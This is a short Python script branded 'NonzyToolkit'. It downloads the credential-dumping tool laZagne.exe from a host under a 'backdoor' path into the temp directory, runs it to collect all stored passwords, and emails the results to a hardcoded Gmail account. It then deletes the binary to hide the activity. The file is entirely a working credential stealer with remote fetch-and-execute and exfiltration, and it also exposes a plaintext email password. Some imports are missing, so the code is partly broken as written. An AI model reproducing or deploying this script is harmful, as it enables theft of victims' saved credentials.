#!/usr/bin/env python

import requests
import optparse
import os, tempfile
import pyfiglet 
from termcolor import colored

banner = pyfiglet.figlet_format("NonzyToolkit")
print colored("=" * 60, "green")
print colored(banner, "yellow")
print colored("=" * 60, "green")

def download(url):
	get_response = requests.get(url)
	file_name = url.split("/")[-1]
	with open(file_name, "wb") as out_file:
		out_file.write(get_response.content)

def send_mail(email, password, message):
	server = smtplib.SMTP("smtp.gmail.com", 587)
	server.starttls()
	server.login(email, password)
	server.sendmail(email, email, message)
	server.quit()

#change file location to system temp directory
temp_directory = tempfile.gettempdir()
os.chdir(temp_directory)

#download file
download("http://192.168.43.81/backdoor/laZagne.exe")
command = "laZagne.exe all"
result = subprocess.check_output(command, shell=True)

#send file to email
send_mail("iwunduchinonso1@gmail.com", "mouau1221108", result)

#remove download file
os.remove("laZagne.exe")